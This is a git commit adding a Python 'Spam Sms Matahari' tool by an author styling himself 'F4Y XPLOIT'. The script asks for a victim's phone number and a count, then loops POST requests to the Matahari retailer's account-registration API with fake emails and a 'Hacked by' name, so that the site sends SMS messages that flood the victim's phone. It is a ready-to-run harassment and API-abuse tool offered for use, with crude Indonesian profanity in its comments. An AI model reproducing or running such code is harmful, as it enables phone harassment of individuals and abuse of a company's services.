9b590a24ae040ad7c11362e0e9a774cb0f1f46b0
F4y Xploit <100696540+f4y-xploit@users.noreply.github.com>
2022-03-25 22:26:44 +0700

    Create fay.py

---
+++ fay.py
@@ -0,0 +1,120 @@
+# AUTHOR : F4Y XPLOIT
+# FOLLOW : F4Y_XPLOIT
+try:    # Jangan ubah ERROR MAMPUS
+        import time,sys,os,json,requests,random
+except ModuleNotFoundError:
+         print ('[!] Install Modul Requests')
+         os.system('pip install requests')
+
+try:    # Memek
+        ip = requests.get('https://api.ipify.org').text
+except requests.exceptions.ConnectionError:
+        exit(' [!] Koneksi Internet Error')
+def mengetik(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.02)
+# Gak usah otak atik babi
+Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
+# Lelah cok
+Name = random.choice(["Hacked by f4y xploit","Hacked by f4y xploit","Hacked by f4y xploit","Hacked by f4y xploit","Hacked by f4y xploit"])
+
+a,m,h,k,b,u,c,p,bn,o = [
+'\033[90m',
+'\033[31m',
+'\033[32m',
+'\033[33m',
+'\033[94m',
+'\033[35m',
+'\033[36m',
+'\033[37m',
+'\033[41m',
+'\033[0m'
+]
+os.system("clear")
+d = input("mau lanjut spam (Y/n): ")
+time.sleep(1)
+#banner ngab
+banner = """
+\033[94m███████████████████████████ 
+\033[94m███████▀▀▀░░░░░░░▀▀▀███████ 
+\033[94m████▀░░░░░░░░░░░░░░░░░▀████ 
+\033[94m███│░░░░░░░░░░░░░░░░░░░│███ 
+\033[94m██▌│░░░░░░░░░░░░░░░░░░░│▐██ 
+\033[94m██░└┐░░░░░░░░░░░░░░░░░┌┘░██ 
+\033[94m██░░└┐░░░░░░░░░░░░░░░┌┘░░██ 
+\033[94m██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██ 
+\033[94m██▌░│██████▌░░░▐██████│░▐██ 
+\033[94m███░│▐███▀▀░░▄░░▀▀███▌│░███ 
+\033[94m██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██ 
+\033[94m██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██ 
+\033[94m████▄─┘██▌░░░░░░░▐██└─▄████ 
+\033[94m█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████ 
+\033[94m████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████ 
+\033[94m█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████ 
+\033[94m███████▄░░░░░░░░░░░▄███████ 
+\033[94m██████████▄▄▄▄▄▄▄██████████ 
+\033[94m███████████████████████████ 
+\033[32m( \033[37mSpam Sms \033[33mMatahari \033[32m| \033[37mBY \033[33mF4Y XPLOIT \033[32m) \033[32m(\033[37mV.2\033[32m)
+
+             \033[37m[\033[32m1\033[37m] \033[37mCreator  \033[31m: \033[33mF4Y XPLOIT
+             \033[37m[\033[32m2\033[37m] \033[33mGithub   \033[31m: \033[37mF4Y-XPLOIT.GIT
+             \033[37m[\033[32m3\033[37m] \033[32mYoutube  \033[31m: \033[33mF4Y XPLOIT
+             \033[37m[\033[32m3\033[37m] \033[32mInstagram\033[31m: \033[33mF4Y_XPLOIT
+\033[35m⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤"""
+os.system('clear')
+
+mengetik('\033[1;96m[-] -> WELCOME TO F4Y XPLOIT TOOLS')
+# meqy
+print (banner)
+print ('%s[%s+%s] %sIP Kamu %s: %s%s' % (p,h,p,k,m,h,ip))
+print ('\033[37m[\033[33m•\033[37m]\033[33m :\033[33m \033[32mMax 10\033[32m ')
+no = input('\n\033[37m[\033[33m•\033[37m] \033[33mex \033[31m: \033[32m08xx\n\033[37m[\033[32m+\033[37m] \033[33mPhone\033[31m:\033[32m ')
+if no =='':
+   exit('\033[37m[\033[31m!\033[37m] Janggan Kosong lurs')
+elif len(no) <= 9:
+   exit('\033[37m[\033[31m!\033[37m] Nomor Tidak Valid ')
+else:
+   jml = int(input('\n\033[37m[\033[32m+\033[37m] \033[33mJumlah\033[31m:\033[32m '))
+
+# lelah asw
+heder = {'Host': 'www.matahari.com',
+           'content-length': '240',
+           'origin': 'https://www.matahari.com',
+           'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
+           'content-type': 'application/json',
+           'accept': '*/*',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
+           'save-data': 'on',
+           'sec-fetch-site': 'same-origin',
+           'sec-fetch-mode': 'cors',
+           'sec-fetch-dest': 'empty',
+           'referer': 'https://www.matahari.com/customer/account/create/',
+           'accept-encoding': 'gzip, deflate, br',
+           'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
+
+
+data = {
+	"thor_customer": {
+		"name": Name,
+		"email_address": Email,
+		"mobile_country_code": "+670",
+		"gender_id": "1",
+		"mobile_number": no,
+		"mro": "",
+		"password": "Wadepak1037",
+		"birth_date": "04/02/2022"
+		}
+	}
+
+print("\n\033[37m[\033[31m!\033[37m] \033[32mMessage ..\n")
+for i in range(jml):
+ 
+      sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
+      if 'Success' in sec.text:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[33mMessage \033[31m: \033[32mSpam Sms Terkirim')
+      else:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[33mMessage \033[31m: \033[31mSpam Sms Gagal')
+      time.sleep(1.5)
+print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Selesai \033[33m:)')
